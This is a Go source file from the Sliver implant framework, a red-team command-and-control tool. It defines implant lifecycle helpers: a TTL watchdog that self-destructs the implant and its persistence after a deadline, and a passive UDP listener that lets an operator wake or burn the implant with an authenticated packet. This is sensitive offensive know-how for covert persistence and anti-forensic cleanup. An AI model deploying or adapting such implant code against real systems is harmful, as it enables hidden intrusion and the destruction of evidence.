package runner

/*
	Sliver Implant Framework
	Copyright (C) 2026  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	------------------------------------------------------------------------

	Implant lifecycle helpers for the trigger-via-standalone Phase 2
	integration. Template-gated startup of:
	  - TTL watchdog (built-in self-destruct deadline)
	  - triggerwake transport (passive UDP listener for operator-fired
	    wake / self-destruct tasks)

	Each helper is template-gated by the corresponding ImplantConfig
	field; the wrapper functions exist unconditionally so runner.Main's
	calls compile in raw form, but the actual goroutine body is gated
	too so it's a no-op (and the bodies aren't even rendered into the
	implant binary) when the feature is off.
*/

import (
	// {{if .Config.TTLEnabled}}
	"time"
	// {{end}}

	// {{if .Config.IncludeTriggerWake}}
	"context"
	"github.com/bishopfox/sliver/implant/sliver/transports/triggerwake"
	// {{end}}

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/burn"
)

// startTTLWatchdog spawns a goroutine that fires burn.Now() when the
// TTL duration elapses from process start. The countdown resets every
// time burn.ResetTTL() is called (i.e., on every authenticated trigger
// packet), ensuring an actively-used implant never self-destructs.
//
// The TTL duration is baked into the binary as TTLMinutes (not as an
// absolute timestamp), so the countdown always starts fresh at runtime
// regardless of when the binary was built. This allows implant configs
// to be reused across deployments.
//
// Check cadence: every minute. The operator-config layer enforces a
// minimum TTL of 1 minute.
func startTTLWatchdog() {
	// {{if .Config.TTLEnabled}}
	go func() {
		ttlDuration := time.Duration({{.Config.TTLMinutes}}) * time.Minute
		deadline := time.Now().Add(ttlDuration)
		// {{if .Config.Debug}}
		log.Printf("[ttl] watchdog armed; duration=%v, initial deadline=%v", ttlDuration, deadline)
		// {{end}}
		ticker := time.NewTicker(time.Minute)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				if time.Now().After(deadline) {
					// {{if .Config.Debug}}
					log.Printf("[ttl] expired — triggering burn")
					// {{end}}
					triggerBurn(burn.ReasonTTLExpired)
					return
				}
			case <-burn.TTLResetChan:
				deadline = time.Now().Add(ttlDuration)
				// {{if .Config.Debug}}
				log.Printf("[ttl] reset — new deadline=%v", deadline)
				// {{end}}
			}
		}
	}()
	// {{end}}
}

// startTriggerWake starts the passive UDP wake/self-destruct listener.
// Called from runner.Main when {{.Config.IncludeTriggerWake}} is true.
func startTriggerWake() {
	// {{if .Config.IncludeTriggerWake}}
	cfg := triggerwake.Config{
		BindAddr:         "{{.Config.TriggerWakeBindAddr}}",
		Secret:           []byte(`{{.Config.TriggerWakeSecret | printf "%s"}}`),
		AllowedClientIDs: []string{
		// {{range .Config.TriggerWakeAllowedClientIDs}}
		"{{.}}",
		// {{end}}
		},
		BurnExtraPaths: []string{
		// {{range .Config.TTLBurnExtraPaths}}
		"{{.}}",
		// {{end}}
		},
		BurnPersistence: []string{
		// {{range .Config.TTLBurnPersistence}}
		"{{.}}",
		// {{end}}
		},
	}
	if _, err := triggerwake.Start(context.Background(), cfg); err != nil {
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] failed to start: %v", err)
		// {{end}}
	}
	// {{end}}
}

// triggerBurn is a thin wrapper so both the TTL watchdog AND any
// future caller (e.g., c2-unreachable threshold) emit a consistent
// burn.Options with the configured extra paths and persistence.
func triggerBurn(reason burn.Reason) {
	burn.Now(burn.Options{
		Reason: reason,
		ExtraPaths: []string{
		// {{range .Config.TTLBurnExtraPaths}}
		"{{.}}",
		// {{end}}
		},
		Persistence: []string{
		// {{range .Config.TTLBurnPersistence}}
		"{{.}}",
		// {{end}}
		},
	})
}
